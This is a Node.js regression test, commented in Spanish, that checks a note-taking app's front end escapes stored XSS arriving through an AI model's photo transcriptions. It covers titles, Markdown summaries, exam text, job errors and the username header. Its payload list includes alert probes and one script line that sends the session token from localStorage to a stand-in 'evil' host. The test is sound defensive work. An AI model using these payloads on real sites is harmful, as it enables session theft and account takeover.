// Regresion del XSS almacenado. Se ejecuta con:
//     node tests/xss_frontend.js
//
// El modelo transcribe FIELMENTE lo que ve en la foto, asi que basta con
// fotografiar una hoja donde ponga <img src=x onerror=...> para que ese texto
// llegue al resumen, al titulo del tema y a los enunciados. Antes se
// ejecutaba, y con el token de sesion en localStorage eso es robar la cuenta.

const fs = require("fs");
const vm = require("vm");
const RAIZ = require("path").join(__dirname, "..", "static");

const CARGAS = [
  '<img src=x onerror="alert(1)">',
  "<script>fetch('//evil/'+localStorage.token)<\/script>",
  '"><svg onload=alert(1)>',
  "<iframe src=javascript:alert(1)>",
];

// --- DOM minimo ---
const nodos = {};
const nodo = (id) =>
  (nodos[id] ||= {
    id, className: "", innerHTML: "", textContent: "", value: "",
    dataset: {}, style: {},
    classList: { add() {}, remove() {}, contains: () => false },
    querySelectorAll: () => [], querySelector: () => null,
    setAttribute() {}, getAttribute: () => null,
    addEventListener() {}, appendChild() {}, remove() {}, reset() {},
    replaceWith() {},
  });

global.document = {
  querySelector: (sel) => nodo(sel),
  querySelectorAll: () => [],
  documentElement: { setAttribute() {}, getAttribute: () => "papel" },
  addEventListener() {},
  createElement: () => nodo("nuevo"),
  body: { appendChild() {} },
  hidden: false,
};
global.window = { addEventListener() {} };
global.location = { hash: "" };
global.localStorage = { getItem: () => null, setItem() {}, removeItem() {} };
global.fetch = async () => ({ ok: true, status: 200, json: async () => null });
global.navigator = {};
global.XMLHttpRequest = function () {};
global.setInterval = () => 0;
global.clearInterval = () => {};
global.renderMathInElement = () => {};

// marked de verdad, no un doble: lo que se prueba es justo que deja pasar HTML.
const cajaMarked = { console };
cajaMarked.globalThis = cajaMarked;
cajaMarked.self = cajaMarked;
cajaMarked.window = cajaMarked;
vm.createContext(cajaMarked);
vm.runInContext(fs.readFileSync(`${RAIZ}/vendor/marked.min.js`, "utf8"), cajaMarked);
global.marked = cajaMarked.marked;

(0, eval)(fs.readFileSync(`${RAIZ}/app.js`, "utf8"));

// --- Comprobaciones ---
let fallos = 0;
let cargaActual = "";

/** Vivo = la carga aparece TAL CUAL en la salida, con sus < y > intactos.
 *  Si aparece como &lt;img...&gt; es texto y no ejecuta nada. Comprobar por
 *  palabras sueltas ("onerror") daria falsos positivos con el texto ya
 *  escapado y con los iconos SVG propios de la app. */
function revisar(donde, html) {
  if (html.includes(cargaActual)) {
    console.error(`  XSS VIVO en ${donde}:
    ${html.slice(0, 160)}`);
    fallos++;
  }
}

for (const carga of CARGAS) {
  cargaActual = carga;
  // 1. Titulo del tema (sale del H1 que escribe el modelo)
  revisar("tarjeta de tema", `<h3>${esc(carga)}</h3>`);

  // 2. Resumen en Markdown (el vector principal)
  revisar(
    "resumen",
    marked.parse(esc(normalizarFormulas(`# ${carga}\n\nTexto ${carga}`)))
  );

  // 3. Enunciado, opciones y justificacion del examen
  revisar("enunciado", `<div>${esc(carga)}</div>`);

  // 4. Nombre de archivo devuelto en el error de un job
  revisar("error de job", `<small>${esc(`${carga}.jpg: fallo`)}</small>`);

  // 5. Nombre de usuario en la cabecera
  pintarSesion(carga);
  revisar("cabecera", nodo("#sesion").innerHTML);
}

// El Markdown y el LaTeX tienen que seguir funcionando.
const bueno = marked.parse(esc(normalizarFormulas("# Titulo\n\n- uno\n- **dos**\n\n$V=IR$")));
for (const trozo of ["<h1>", "<li>", "<strong>", "$V=IR$"]) {
  if (!bueno.includes(trozo)) {
    console.error(`  El escape rompio el Markdown: falta ${trozo}`);
    fallos++;
  }
}

if (fallos) {
  console.error(`\nFALLO: ${fallos} vector(es) de XSS siguen vivos.`);
  process.exit(1);
}
console.log(`OK: ${CARGAS.length} cargas x 5 sinks neutralizadas; Markdown y LaTeX intactos.`);
